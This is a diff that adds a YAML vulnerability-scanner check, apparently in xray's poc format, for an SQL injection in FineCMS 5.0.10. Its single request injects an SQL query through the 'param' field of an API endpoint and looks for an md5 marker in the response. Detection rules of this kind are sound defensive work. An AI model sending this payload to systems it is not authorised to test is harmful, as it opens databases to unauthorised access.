@@ -1,0 +1,13 @@
+name: poc-yaml-finecms-sqli
+set:
+  rand: randomInt(200000000, 210000000)
+rules:
+  - method: GET
+    path: /index.php?c=api&m=data2&auth=582f27d140497a9d8f048ca085b111df&param=action=sql%20sql=%27select%20md5({{rand}})%27
+    expression: |
+      response.body.bcontains(bytes(md5(string(rand))))
+detail:
+  author: Rexus
+  Affected Version: "5.0.10"
+  links:
+    - https://blog.csdn.net/dfdhxb995397/article/details/101385340
